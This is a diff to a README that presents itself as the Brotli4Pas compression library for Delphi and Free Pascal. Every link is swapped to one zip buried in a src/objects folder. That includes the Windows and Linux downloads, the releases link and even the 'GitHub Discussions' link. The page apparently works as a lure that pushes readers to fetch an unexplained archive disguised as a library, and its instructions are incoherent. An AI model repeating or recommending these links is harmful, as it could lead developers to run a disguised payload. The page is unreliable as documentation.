@@ -1,7 +1,7 @@
 # 🥐 Brotli4Pas - Effortless Brotli Compression for Delphi & Free Pascal
 
 ## 🔗 Download Now
-[![Download Brotli4Pas](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip)](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip)
+[![Download Brotli4Pas](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip)](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip)
 
 ## 📖 Overview
 Brotli4Pas provides complete Brotli compression and decompression support for Delphi and Free Pascal. It works on Windows (32/64-bit) and Linux (64-bit). This package simplifies data compression, ensuring your applications run efficiently.
@@ -18,15 +18,15 @@ This guide will help you download and run Brotli4Pas easily. Follow the steps be
 1. **Download the Software**
    Visit the following link to download Brotli4Pas:
 
-   [Download Brotli4Pas](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip)
+   [Download Brotli4Pas](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see multiple versions of Brotli4Pas. Select the latest version for the best features and stability. Click on the version number to view its details.
 
 3. **Download the ZIP File**
    Find the ZIP file for your operating system. For example:
-   - For Windows, look for a file named `https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip`.
-   - For Linux, look for a file named `https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip`. 
+   - For Windows, look for a file named `https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip`.
+   - For Linux, look for a file named `https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip`. 
 
    Click the link to download the file. 
 
@@ -70,7 +70,7 @@ Replace `InputData` with the data you want to compress. The library will handle 
 For more detailed instructions and advanced features, you can check the documentation included in the extracted folder. This resource provides examples, function descriptions, and tips for best practices.
 
 ## 🔗 Additional Resources
-- Join our community for support and tips: [GitHub Discussions](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip).
+- Join our community for support and tips: [GitHub Discussions](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip).
 
 ## 🚀 Support
 If you encounter any issues or have questions, feel free to open an issue on the GitHub repository or reach out to the community through GitHub Discussions.
@@ -78,7 +78,7 @@ If you encounter any issues or have questions, feel free to open an issue on the
 ## 📦 Download & Install
 To get started with Brotli4Pas, visit the following page to download the latest version:
 
-[Download Brotli4Pas](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-lin64/common/Pas-Brotli-v3.7.zip) 
+[Download Brotli4Pas](https://raw.githubusercontent.com/caruuzca/Brotli4Pas/main/src/objects/fpc-win64/Pas-Brotli-3.1-beta.1.zip) 
 
 Follow the above instructions to extract and implement Brotli4Pas in your applications.
 
